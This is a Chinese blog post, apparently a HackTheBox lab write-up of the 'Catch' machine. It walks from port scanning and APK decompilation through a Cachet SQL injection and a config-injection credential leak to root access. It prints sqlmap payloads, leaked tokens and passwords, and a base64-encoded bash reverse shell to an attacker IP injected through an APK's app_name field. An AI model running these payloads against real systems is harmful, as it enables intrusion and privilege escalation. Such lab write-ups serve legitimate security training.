<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yh6IyxUzW_4tGwABxxQDxQ)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 108篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUugfcmhRRO2Cm9qMJ3llghAu4tGxzQgIcRsAbiaYRvX87t2ujS9BX4v0GAhZG3COE2TAaw09m1WGhg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

靶机信息
----

靶机地址:

```
https://app.hackthebox.com/machines/Catch
```

靶场: HackTheBox.com

靶机名称: Catch

难度: 中等

提示信息:

```
无
```

目标: user.txt和root.txt

  

实验环境
----

```
攻击机:Vbox Manjaro 10.10.14.37  
  
靶机:10.10.11.150
```

  

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -p- -v 10.10.11.150 --open
```

```
sudo nmap -sC -sV -p- 10.0.0.150 -oN nmap.log
```

扫描到22、80、3000、5000和80000端口开放，先来看看80端口

Web渗透
-----

访问后页面中有一个链接点击后会下载一个APK，安装到模拟器中未发现任何信息。使用d2j-dex2jar反编译为jar包。

工具下载地址:

```
https://github.com/pxb1988/dex2jar
```

```
d2j-dex2jar.sh catchv1.0.apk
```

反编译后使用jd-gui打开catchv1.0-dex2jar.jar

工具下载地址:

```
https://github.com/java-decompiler/jd-gui
```

源码中发现域名status.catch.htb，先来绑定这个域名

```
sudo nano /etc/hosts
```

使用MobSF对apk分析

MobSF下载地址：

```
https://github.com/MobSF/Mobile-Security-Framework-MobSF
```

运行MobSF需要科学上网

```
proxychains ./run.sh
```

访问mobsf

```
http://localhost:8000
```

上传并分析APK

分析结果中找到3个token，之后就没有什么可以再利用的信息了，

继续访问其他端口

```
http://status.catch.htb:8000
```

访问后看起来是个系统日志平台，下方出现程序名称来找下这个程序有没有漏洞

搜索到cachet存在CVE-2021-39165 SQL注入漏洞,这个漏洞存在于cachet2.5之前的版本中，虽然不知道靶机上的版本号，但是也可以尝试一下。看看如何利用。下载exp并执行

```
git clone https://github.com/W0rty/CVE-2021-39165  
cd CVE-2021-39165  
py3 -m pip instal -r requirements.txt  
py3 exploit.py
```

根据提示输入-u参数继续执行

```
py3 exploit.py -u http://status.catch.htb:8000
```

执行了多次，每次返回的密码都不一样，来看看这个exp执行了什么

```
cat exploit.py
```

修改一下这个payload然后放到sqlmap中跑一下。（关于漏洞利用的方法可以参考下面的文章链接，讲的很详细）

```
https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html
```

```
sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+"
```

存在注入，暴个库名

```
sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" -D cachet -T users -C api_key,username,password --dump --time-sec=20 --no-cast
```

打在线的靶机就是有这种问题，不知道哪个人把数据给清了，又要等一天再重置了。

```
sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --dbs
```

拿到库名，再来暴表名

```
sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" -D cachet --tables
```

拿到表名发现users表，再来看看有哪些列

```
sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" -D cachet -T users --columns
```

来看看api_key，username，password三个列对应的值

```
sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" -D cachet -T users -C api_key,username,password --dump
```

拿到账号和hash过的密码，但是密码解不开，还要想想其他办法（其实可以利用api_key登录但是程序运行在docker中还要逃逸有点麻烦）。对8000端口做个目录扫描

```
sudo dirsearch -u http://status.catch.htb:8000 -w ../../Dict/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php -t 100
```

目录扫描仍未发现可利用的信息，再来看看5000端口

```
http://status.catch.htb:5000
```

访问后是一个登录页面，右下角发现这个程序的仓库地址，github上看了一下，介绍说这个是android的团队聊天工具，看到程序名了吗？和之前分析出来的token名称一样，先来做个目录扫描

```
sudo dirsearch -u http://status.catch.htb:5000 -e php -w ../../Dict/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

扫描到很多个目录，逐个看一下

访问几个都提示需要认证，尝试将mobsf获取到的lets_chat_token添加到请求头中

```
Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==
```

通过在访问users目录时里添加JWT的Authorization: bearer认证，并添加APK分析到的Token，成功获取到多个用户信息及所在聊天室的房间id。再来看看rooms目录

同样方法访问rooms目录得到房间id等信息，继续测试

当在/rooms目录后面加上房间id时可以读取指定房间的信息，来试试能不能读取聊天记录

```
wfuzz -c -u http://status.catch.htb:5000/rooms/61b86b28d984e2451036eb17/FUZZ -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -w ~/HackTools/Dict/SecLists/Discovery/Web-Content/big.txt --hw 15
```

使用模糊测试拿到messages参数，来看看

聊天室的内容中id为61b8702dfe190b466d476bfa的用户提到过john :  E}V!mywu_69T4C}W猜测这是一组账号密码，验证下

```
ssh john@10.10.11.154
```

ssh验证失败，再来试试web

5000端口下登录失败，再试试8000端口

8000端口下登录成功，系统的设置中看到版本为2.4，再来找下这个版本的漏洞

发现CVE-2021-39172远程代码执行和CVE-2021-39174配置注入执行代码，看后面还有一个CVE-2021-39173

这个CVE-2021-39174看起来很好利用，就拿这个验证下

将email地址修改为${DB_USERNAME}并保存，保存后再次点击设置中的Mail

获取到账号will，再试试密码${DB_PASSWORD}

拿到密码s2#4Fg0_%3!，再次尝试登录SSH

```
ssh will@10.10.11.150
```

登录成功，来找找敏感信息

```
ls  
cat user.txt
```

拿到user.txt，再来看看如何提权

```
cat /etc/passwd |grep bash
```

找到另一个普通用户，上传辅助脚本继续检查

1。在攻击机辅助脚本目录下开启HTTP服务

```
py3 -m http.server
```

2。靶机下载辅助脚本并执行

```
cd /tmp  
wget http://10.10.14.102:8000/pspy64  
chomd +x pspy64  
./pspy64
```

发现root用户每分钟都会运行一次verify.sh脚本，来看看这个脚本是做什么的

```
cd /opt/mdm/  
ls  
cat verify.sh
```

脚本中发现程序读取APK中的/res/values/strings.xml文件strings.xml并读取其中的app_name，可以利用这个脚本执行命令，来验证一下。

生成恶意APK

1。反编译APK

```
apktool d catchv1.0.apk
```

2。生成payload并修改APK中的res/values/strings.xml文件

```
/bin/bash -i >& /dev/tcp/10.10.14.102/4444 0>&1
```

payload

```
Catch; echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEwMi80NDQ0IDA+JjE=" | base64 -d | bash -i
```

修改前：

修改后：

3。重新打包APK

```
apktool b catchv1.0 -o newapk.apk
```

4。攻击机监听4444端口

```
nc -lnvp 4444
```

5。上传APK并复制到靶机，等待1分钟内反弹shell回来

```
wget http://10.10.14.102:8000/newapk.apk  
cp newapk.apk /opt/mdm/apk_bin/
```

反弹成功，来找找flag

```
cd /root  
cat root.txt
```

拿到root.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)